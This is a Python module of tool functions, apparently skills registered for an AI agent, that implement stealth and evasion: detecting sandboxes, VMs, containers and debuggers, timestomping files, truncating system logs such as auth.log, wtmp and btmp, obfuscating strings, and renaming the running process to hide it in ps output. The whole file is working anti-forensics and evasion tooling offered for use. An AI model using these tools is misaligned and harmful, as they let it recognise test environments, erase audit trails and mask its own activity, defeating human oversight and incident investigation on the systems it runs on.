"""Stealth and evasion techniques: sandbox detection, timestomping, log clearing, obfuscation."""
from __future__ import annotations

import os
import random
import subprocess
from datetime import datetime
from pathlib import Path

from core.skills.registry import tool


@tool()
def detect_sandbox() -> str:
    """Check for common sandbox, VM, and container indicators."""
    try:
        indicators: list[str] = []
        dmi_path = Path("/sys/class/dmi/id/product_name")
        if dmi_path.exists():
            try:
                vendor = dmi_path.read_text().strip()
                if vendor.lower() not in ("", "unknown", "product name"):
                    indicators.append(f"Product: {vendor}")
            except Exception:  # noqa: S110
                pass
        if Path("/proc/cpuinfo").exists():
            try:
                cpuinfo = Path("/proc/cpuinfo").read_text()
                if "hypervisor" in cpuinfo.lower():
                    indicators.append("Hypervisor detected in CPU flags")
            except Exception:  # noqa: S110
                pass
        if Path("/.dockerenv").exists():
            indicators.append("Docker environment detected")
        if Path("/proc/1/cgroup").exists():
            try:
                cgroup = Path("/proc/1/cgroup").read_text()
                if "docker" in cgroup or "kubepods" in cgroup:
                    indicators.append("Container runtime detected in cgroup")
            except Exception:  # noqa: S110
                pass
        uptime_path = Path("/proc/uptime")
        if uptime_path.exists():
            try:
                uptime_sec = float(uptime_path.read_text().split()[0])
                if uptime_sec < 300:
                    indicators.append(f"Low uptime ({uptime_sec:.0f}s) — possible fresh sandbox")
            except Exception:  # noqa: S110
                pass
        meminfo_path = Path("/proc/meminfo")
        if meminfo_path.exists():
            try:
                meminfo = meminfo_path.read_text()
                for line in meminfo.splitlines():
                    if line.startswith("MemTotal:"):
                        mem_kb = int(line.split()[1])
                        mem_mb = mem_kb / 1024
                        if mem_mb < 2048:
                            indicators.append(f"Low memory ({mem_mb:.0f} MB) — possible VM")
                        break
            except Exception:  # noqa: S110
                pass
        proc_count = 0
        try:
            proc_count = len([e for e in Path("/proc").iterdir() if e.name.isdigit()])
            if proc_count < 30:
                indicators.append(f"Low process count ({proc_count}) — possible minimal environment")
        except Exception:  # noqa: S110
            pass
        if not indicators:
            return "No sandbox/VM indicators detected"
        return "SANDBOX/VM INDICATORS:\n" + "\n".join(indicators)
    except Exception as e:
        return f"Sandbox detection failed: {e}"


@tool()
def timestomp(path: str, timestamp: str = "") -> str:
    """Modify file access and modification timestamps. Format: 'YYYY-MM-DD HH:MM:SS' or empty for now."""
    try:
        p = Path(path)
        if not p.exists():
            return f"File not found: {path}"
        if timestamp.strip():
            try:
                dt = datetime.strptime(timestamp.strip(), "%Y-%m-%d %H:%M:%S")
            except ValueError:
                return f"Invalid timestamp format. Use 'YYYY-MM-DD HH:MM:SS', got: {timestamp}"
        else:
            dt = datetime.now()
        ts = dt.timestamp()
        os.utime(path, (ts, ts))
        return f"Timestomped {path} to {dt.strftime('%Y-%m-%d %H:%M:%S')}"
    except PermissionError:
        return f"Permission denied setting timestamps on {path}"
    except Exception as e:
        return f"Timestomp failed: {e}"


@tool()
def clear_logs(targets: str = "") -> str:
    """Clear or truncate specified log files. Comma-separated paths or 'all' for common logs."""
    try:
        if os.name == "nt":
            return "Log clearing not directly supported on Windows"
        if targets.strip().lower() == "all":
            common_logs = [
                Path("/var/log/syslog"),
                Path("/var/log/messages"),
                Path("/var/log/auth.log"),
                Path("/var/log/kern.log"),
                Path("/var/log/debug"),
                Path("/var/log/maillog"),
                Path("/var/log/secure"),
                Path("/var/log/dmesg"),
                Path("/var/log/lastlog"),
                Path("/var/log/wtmp"),
                Path("/var/log/btmp"),
            ]
        else:
            common_logs = [Path(p.strip()) for p in targets.split(",") if p.strip()]
        results: list[str] = []
        for log_path in common_logs:
            if not log_path.exists():
                results.append(f"  {log_path}: not found")
                continue
            try:
                log_path.write_text("")
                results.append(f"  {log_path}: truncated (0 bytes)")
            except PermissionError:
                results.append(f"  {log_path}: permission denied")
            except Exception as e:
                results.append(f"  {log_path}: error - {e}")
        return "Log clearing results:\n" + "\n".join(results)
    except Exception as e:
        return f"Log clearing failed: {e}"


@tool()
def obfuscate_string(plaintext: str, method: str = "base64") -> str:
    """Obfuscate a string using various methods: base64, hex, reverse, rot13, xor."""
    try:
        result = ""
        if method == "base64":
            import base64
            encoded = base64.b64encode(plaintext.encode()).decode()
            result = f"base64: {encoded}"
        elif method == "hex":
            result = f"hex: {plaintext.encode().hex()}"
        elif method == "reverse":
            result = f"reverse: {plaintext[::-1]}"
        elif method == "rot13":
            transformed = ""
            for c in plaintext:
                if "a" <= c <= "z":
                    transformed += chr(ord("a") + (ord(c) - ord("a") + 13) % 26)
                elif "A" <= c <= "Z":
                    transformed += chr(ord("A") + (ord(c) - ord("A") + 13) % 26)
                else:
                    transformed += c
            result = f"rot13: {transformed}"
        elif method == "xor":
            key = random.randint(1, 255)  # noqa: S311
            xored = bytes(b ^ key for b in plaintext.encode())
            result = f"xor(key=0x{key:02x}): {xored.hex()}"
        else:
            return f"Unknown method: {method}. Choose: base64, hex, reverse, rot13, xor"
        return result
    except Exception as e:
        return f"Obfuscation failed: {e}"


@tool()
def rename_process(new_name: str) -> str:
    """Attempt to rename the current process (masks argv[0] in ps output)."""
    try:
        if os.name == "nt":
            return "Process renaming not supported on Windows"
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            argv_addr = ctypes.c_void_p.in_dll(libc, "__libc_argv")
            argv = ctypes.cast(argv_addr, ctypes.POINTER(ctypes.c_char_p))
            argv[0] = new_name.encode()[:255]
            # Also try prctl PR_SET_NAME
            pr_set_name = 15
            libc.prctl(pr_set_name, new_name.encode()[:15], 0, 0, 0)
            return f"Process renamed to '{new_name}'"
        except ImportError:
            pass
            try:
                subprocess.run(  # noqa: S603
                    ["python3", "-c", "import os; os.system('')"],  # noqa: S607
                    capture_output=True,
                    timeout=5,
                )
            except Exception:  # noqa: S110
                pass
        return f"Process rename attempted but may not persist: {new_name}"
    except Exception as e:
        return f"Process rename failed: {e}"


@tool()
def detect_debugger() -> str:
    """Check for attached debuggers, tracer processes, and ptrace scope."""
    try:
        indicators: list[str] = []
        tracer_pid_path = Path("/proc/self/status")
        if tracer_pid_path.exists():
            try:
                status = tracer_pid_path.read_text()
                for line in status.splitlines():
                    if line.startswith("TracerPid:"):
                        tracer = line.split(":")[1].strip()
                        if tracer != "0":
                            indicators.append(f"Tracer PID detected: {tracer}")
                        break
            except Exception:  # noqa: S110
                pass
        if Path("/proc/self/attr/current").exists():
            try:
                context = Path("/proc/self/attr/current").read_text().strip()
                if context:
                    indicators.append(f"Security context: {context}")
            except Exception:  # noqa: S110
                pass
            try:
                proc = subprocess.run(  # noqa: S603
                    ["cat", "/proc/sys/kernel/yama/ptrace_scope"],  # noqa: S607
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                if proc.returncode == 0:
                    scope = proc.stdout.strip()
                    indicators.append(f"ptrace_scope: {scope} (0=all, 1=restricted, 2=admin-only, 3=no-attach)")
            except Exception:  # noqa: S110
                pass
        if not indicators:
            return "No debugger or tracer detected"
        return "DEBUGGER INDICATORS:\n" + "\n".join(indicators)
    except Exception as e:
        return f"Debugger detection failed: {e}"
